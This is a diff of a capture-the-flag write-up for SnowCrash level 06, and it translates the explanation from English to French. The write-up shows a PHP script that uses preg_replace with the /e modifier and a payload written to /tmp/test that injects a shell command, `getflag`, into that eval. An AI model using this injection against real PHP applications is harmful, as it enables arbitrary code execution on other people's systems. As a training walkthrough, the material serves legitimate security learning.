@@ -1,6 +1,6 @@
-# Level 06
+# 06 - PHP exploit: entrée utilisateur
 
-- We login as user level06.
+- On se connecte en tant que level06.
 ```
 level06@SnowCrash:~$ ls -l
 total 12
@@ -14,7 +14,10 @@ PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level0
 ```
 
 
-- A binary as well as a PHP script are present, the binary appears to execute the PHP script. Here is the content of the script:
+- Un binaire ainsi qu'un script PHP sont présents, le binaire semble exécuter le script PHP.
+```
+level06@SnowCrash:~$ cat level06.php
+```
 ```php
 #!/usr/bin/php
 <?php
@@ -37,12 +40,11 @@ $r = x($argv[1], $argv[2]); print $r;
 ```
 
 
-- The script makes calls to `preg_replace()` to format the content of the file given to it as first parameter before displaying it.
-The line of interest to us is the following:
+- Le script effectue des appels à `preg_replace()` pour formater le contenu du fichier qui lui est donné en premier paramètre avant de l'afficher. La ligne qui nous intéresse est la suivante:
 >`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`
 
 
-- This line states that if the content of the file starts with `[x ` and ends with `]`, everything located between these boundaries can be executed as PHP code (due to `/e`). The output of this execution will then be passed as a parameter to the `y()` function, so:
+- Cette ligne indique que si le contenu du fichier commence par `[x ` et se termine par `]`, tout ce qui se trouve entre ces limites peut être exécuté en tant que code PHP (en raison du `/e`). La sortie de cette exécution sera ensuite transmise en tant que paramètre à la fonction `y()`, du coup:
 ```
 level06@SnowCrash:~$ echo "[x \${\`getflag\`}]" > /tmp/test
 ```
